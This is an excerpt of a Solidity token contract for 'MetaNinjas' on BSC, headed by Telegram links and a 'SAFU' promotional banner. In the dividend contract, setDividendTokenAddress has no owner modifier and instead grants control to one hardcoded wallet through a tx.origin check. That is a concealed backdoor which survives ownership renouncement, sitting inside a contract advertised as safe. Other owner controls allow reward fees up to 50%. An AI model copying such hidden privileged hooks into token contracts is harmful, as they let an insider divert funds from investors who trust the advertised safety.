...
https://t.me/MetaNinjas_bsc

https://MetaNinjas.cc


WELCOME TO THE Ninjas!!! WE ARE SAFU Ninjas!!!! Come ask our team any qestions!!!
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x9B84d5dcD49548b22223B608b424b37fb072Ec15, "Only owner can change dividend contract address");
...
contract MetaNinjas is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("MetaNinja", "NINJA") {
    	cakeDividendTracker = new CakeDividendTracker();


    	marketingWallet = 0x35325eDA98928Cf2452d473C8fF94729E650654A;
    ...
    function tradeStart() external onlyOwner {
        ...
        maxSellTransactionAmount = 1010000000 * (10**18);
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "metaninjaback: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "metaninjaback: The new dividend tracker must be owned by the metaninjaback token contract");
    ...
    function updateCakeDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 50, "Fee must be less than 50%");
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("metaninjaback_Dividend_Tracker", "metaninjaback_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 150000 * (10**18); //must hold 150,000+++ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "metaninjaback_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "metaninjaback_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "metaninjaback_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "metaninjaback_Dividend_Tracker: Cannot update claimWait to same value");
